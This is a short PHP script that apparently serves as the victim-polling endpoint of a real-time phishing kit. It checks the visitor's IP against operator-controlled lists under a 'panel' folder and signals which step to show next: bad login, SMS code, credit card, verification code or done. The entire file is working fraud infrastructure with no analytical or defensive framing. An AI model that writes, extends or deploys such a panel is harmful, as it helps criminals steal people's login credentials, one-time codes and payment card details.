<?

error_reporting(0);

if ($_GET['waiting'] == '1') {
 
if (txt('badlogin')) {
    $f = fopen("./panel/badlogin.txt", "w");
    echo "badlogin";
    exit();
}
if (txt('sms')) {
    $f = fopen("./panel/sms.txt", "w");
    echo "sms";
    exit();
}
if (txt('badsms')) {
    $f = fopen("./panel/badsms.txt", "w");
    echo "badsms";
    exit();
}
if (txt('done')) {
    $f = fopen("./panel/done.txt", "w");
    echo "done";
    exit();
}
if (txt('cc')) {
    $f = fopen("./panel/cc.txt", "w");
    echo "cc";
    exit();
}
if (txt('badcc')) {
    $f = fopen("./panel/badcc.txt", "w");
    echo "badcc";
    exit();
}
if (txt('code')) {
    $f = fopen("./panel/code.txt", "w");
    echo "code";
    exit();
}
if (txt('badcode')) {
    $f = fopen("./panel/badcode.txt", "w");
    echo "badcode";
    exit();
}


}

function txt($name){
	$list = file("./panel/".$name.".txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	if (in_array(get_client_ip(), $list) ){
    return true;
		}
        return false; 
	}

function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
